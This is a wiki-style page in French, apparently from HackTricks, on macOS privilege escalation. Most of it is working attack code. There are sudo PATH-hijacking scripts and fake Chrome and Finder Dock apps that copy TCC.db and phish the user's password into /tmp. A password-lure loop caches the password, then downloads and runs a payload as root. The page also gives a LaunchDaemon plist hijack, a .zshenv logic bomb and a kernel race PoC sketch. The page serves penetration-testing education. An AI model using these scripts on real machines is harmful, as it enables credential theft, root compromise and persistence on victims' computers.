# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si vous êtes venu ici pour TCC privilege escalation, allez à :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Veuillez noter que **la plupart des astuces concernant privilege escalation affectant Linux/Unix affectent aussi les machines MacOS**. Consultez :


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

Vous pouvez trouver la technique originale [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Cela signifie qu'une autre façon de réaliser cette attaque serait de **hijack other binaries** que la victime exécutera lorsqu'elle **exécutera `sudo` :**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu'un utilisateur qui utilise le terminal aura très probablement **Homebrew installed**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Dock Impersonation

En utilisant du **social engineering**, vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le Dock et exécuter réellement votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock s'il y a un Chrome, et, dans ce cas, **supprimez** cette entrée et **ajoutez** la **fausse** **entrée Chrome à la même position** dans le Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas retirer Finder du Dock**, donc si vous allez l'ajouter au Dock, vous pouvez placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l'entrée du faux Finder au début du tableau Dock**.
- Une autre option est de ne pas le placer dans le Dock et simplement l'ouvrir — "Finder asking to control Finder" n'est pas si étrange.
- Une autre option pour **escalate to root without asking** le mot de passe via une boîte horrible est de faire en sorte que Finder demande réellement le mot de passe pour effectuer une action privilégiée :
- Demandez à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (l'invite demandant le mot de passe indiquera que « Finder veut copier sudo »)
- Demandez à Finder de copier un nouveau **Authorization Plugin** (vous pouvez contrôler le nom du fichier afin que l'invite demandant le mot de passe indique que « Finder veut copier Finder.bundle »)

<details>
<summary>Script d'usurpation de Finder dans le Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Leurre de saisie de mot de passe (phishing) + réutilisation de sudo

Malware abuse fréquemment l'interaction utilisateur pour **capturer un mot de passe utilisable avec sudo** et le réutiliser de manière programmatique. Flux typique :

1. Identifier l'utilisateur connecté avec `whoami`.
2. **Boucler les invites de mot de passe** jusqu'à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre en cache l'identifiant (p.ex., `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via stdin).

Exemple de chaîne minimale:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **effacer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d'autres fichiers privilégiés, et exécuter des étapes supplémentaires sans interaction.

## Nouveaux vecteurs spécifiques à macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` déprécié mais encore utilisable

`AuthorizationExecuteWithPrivileges` a été déprécié dans 10.7 mais **fonctionne encore sur Sonoma/Sequoia**. De nombreux updaters commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non fiable. Si le binaire cible est modifiable par l'utilisateur, vous pouvez y implanter un trojan et profiter de l'invite légitime :
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combinez avec les **masquerading tricks above** pour présenter une boîte de dialogue de mot de passe crédible.

### Privileged helper / XPC triage

Beaucoup de privescs tierces modernes sur macOS suivent le même schéma : un **root LaunchDaemon** expose un **Mach/XPC service** depuis **`/Library/PrivilegedHelperTools`**, puis le helper soit **ne valide pas le client**, le valide **trop tard** (PID race), ou expose une **root method** qui prend en entrée un **user-controlled path/script**. Il s'agit de la classe de bug à l'origine de nombreux bugs récents de helpers dans les clients VPN, les game launchers et les updaters.

Checklist de triage rapide :
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Portez une attention particulière aux helpers qui :

- continuent d'accepter des requêtes **après la désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent des configurations depuis **`/Applications/...`** ou d'autres chemins écrits par des utilisateurs non-root
- se basent sur une validation de pair **basée sur le PID** ou **uniquement sur le bundle-id** qui peut être sujette à des conditions de course

Pour plus de détails sur les bugs d'autorisation des helpers consultez [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Avant qu'Apple ne corrige cela dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations initiées par l'utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter des **PKG scripts as root inside the current user's environment**. Cela signifie qu'un package utilisant **`#!/bin/zsh`** chargerait le **`~/.zshenv`** de l'attaquant et l'exécuterait en tant que **root** lorsque la victime installait le package.

Ceci est particulièrement intéressant en tant que **logic bomb** : il suffit d'une présence initiale dans le compte de l'utilisateur et d'un fichier de démarrage de shell modifiable, puis d'attendre qu'un installateur vulnérable **zsh-based** soit exécuté par l'utilisateur. Cela ne s'applique **généralement pas** aux déploiements **MDM/Munki** car ceux-ci s'exécutent dans l'environnement de l'utilisateur root.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Si vous voulez une étude plus approfondie sur l'abus spécifique aux installateurs, consultez aussi [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Si un LaunchDaemon plist ou sa cible `ProgramArguments` est **user-writable**, vous pouvez obtenir une élévation de privilèges en le remplaçant puis en forçant launchd à recharger :
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ceci reflète le schéma d'exploitation publié pour **CVE-2025-24085**, où un writable plist a été abusé pour exécuter du code d'attaquant en tant que root.

### XNU SMR credential race (CVE-2025-24118)

Une **race dans `kauth_cred_proc_update`** permet à un attaquant local de corrompre le pointeur d'identifiants en lecture seule (`proc_ro.p_ucred`) en mettant en concurrence des boucles `setgid()`/`getgid()` sur plusieurs threads jusqu'à ce qu'un torn `memcpy` se produise. La corruption réussie donne **uid 0** et accès à la mémoire du noyau. Structure minimale du PoC :
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
À coupler avec heap grooming pour placer des données contrôlées là où le pointeur relit. Sur les builds vulnérables, c'est un **local kernel privesc** fiable sans nécessité de contourner SIP.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Si vous avez déjà root, SIP bloque toujours les écritures vers les emplacements système. Le bug **Migraine** abuse de l'entitlement Migration Assistant `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du contournement SIP et écrase des chemins protégés (par ex., `/System/Library/LaunchDaemons`). La chaîne :

1. Obtenir root sur un système en cours d'exécution.
2. Déclencher `systemmigrationd` avec un état forgé pour exécuter un binaire contrôlé par l'attaquant.
3. Utiliser l'entitlement hérité pour patcher des fichiers protégés par SIP, persistant même après redémarrage.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et ne valident que le champ `expressionType`, qui est contrôlé par l'attaquant. En construisant un predicate qui évalue des selectors arbitraires, vous pouvez obtenir une **exécution de code dans des services XPC root/système** (par ex., `coreduetd`, `contextstored`). Lorsqu'il est combiné avec un sandbox escape initial d'une app, cela accorde une **privilege escalation sans prompts utilisateur**. Recherchez des endpoints XPC qui désérialisent des predicates et manquent d'un visitor robuste.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (même non privilégiés) peut créer et monter un time machine snapshot et **accéder à TOUS les fichiers** de ce snapshot.  
Le **seul privilège** nécessaire est que l'application utilisée (comme `Terminal`) ait **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.

<details>
<summary>Monter un snapshot Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Une explication plus détaillée peut être [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.

## Informations sensibles

Cela peut être utile pour escalader les privilèges :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Références

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
